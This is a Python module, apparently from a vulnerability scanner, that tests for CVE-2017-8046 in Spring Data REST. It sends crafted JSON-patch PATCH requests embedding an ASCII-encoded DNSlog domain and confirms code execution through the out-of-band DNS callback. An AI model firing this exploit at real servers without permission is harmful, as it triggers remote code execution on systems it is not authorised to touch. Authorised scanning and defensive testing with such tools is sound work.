#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from thirdparty import requests
from time import sleep

def cve_2017_8046_scan(self, url):
    ''' 构造ASCII码的JSON数据包, 向spring-data-rest服务器提交恶意PATCH请求, 可以执行任意代码 '''
    sessid = '8d2aba535b132733b453254c40e50f95'
    
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'RCE'
    vul_info['vul_id'] = 'CVE-2017-8046'
    # vul_info['vul_method'] = 'PATCH'
    vul_info['headers'] = {
        'Content-Type': 'application/json-patch+json'
    }

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    try:
        # * 先使用POST请求添加一个对象, 防止目标不存在对象 导致漏洞利用失败
        res0 = requests.post(
            url, 
            timeout=self.timeout, 
            headers={'Content-Type': 'application/json'},
            data='{}', 
            proxies=self.proxies, 
            verify=False,
            allow_redirects=False
        )
        logger.logging(vul_info, res0.status_code, res0)

        for payload in self.cve_2017_8046_payloads:
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名
            
            # ! 该漏洞的Payload需要转换成ASCII码, 以逗号分隔每一个字母的ASCII编码
            ascii_dns_domain = ''
            for b in dns_domain:
                ascii_dns_domain += str(ord(b)) + ','

            if url[-1] != '/':
                url += '/'
            path = payload['path']
            data = payload['data'].replace('DNSDOMAIN', ascii_dns_domain[:-1])
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            res = requests.patch(
                target, 
                timeout=self.timeout, 
                headers=headers,
                data=data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)                        # * LOG

            sleep(3)
            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res,
                    'Encodeing': 'ASCII'
                }
                return results
    except requests.ConnectTimeout:
        logger.logging(vul_info, 'Timeout')
        return None
    except requests.ConnectionError:
        logger.logging(vul_info, 'Faild')
        return None
    except:
        logger.logging(vul_info, 'Error')
        return None
